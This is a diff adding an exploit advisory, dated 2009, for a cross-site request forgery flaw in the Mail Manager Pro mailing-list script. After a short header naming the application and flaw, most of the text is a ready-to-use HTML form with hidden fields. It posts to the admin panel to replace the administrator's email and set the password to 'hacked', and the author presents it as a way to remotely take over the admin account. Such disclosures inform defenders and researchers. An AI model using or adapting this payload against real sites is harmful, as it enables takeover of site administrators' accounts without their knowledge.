@@ -1,0 +1,29 @@
+[#-----------------------------------------------------------------------------------------------#]
+[#] Title: Mail Manager Pro XSRF (Change Admin Password)
+[#] Author: Milos Zivanovic
+[#] Email: milosz.security[at]gmail.com
+[#] Date: 14. December 2009.
+
+[#] Application: Mail Manager Pro
+[#] Version: the only one there is
+[#] Link: http://www.scriptsez.net/?action=details&cat=Mailing%20List%20Managers&id=1192650742
+[#] Price: 15 USD
+[#] Vulnerability: Cross Site Request Forgery
+[#-----------------------------------------------------------------------------------------------#]
+
+
+With this exploit we can remotely change admins password.
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/mmp/admin.php?action=change&mode=verify"
+method="post">
+<input type="hidden" name="admin_id" value="admin">
+<input type="hidden" name="admin_email" value="my@newmail.net">
+<input type="hidden" name="company" value="My Company">
+<input type="hidden" name="admin_pass" value="hacked">
+<input type="hidden" name="cpass" value="hacked">
+<input type="submit" name="submit" value="Change">
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[#] EOF
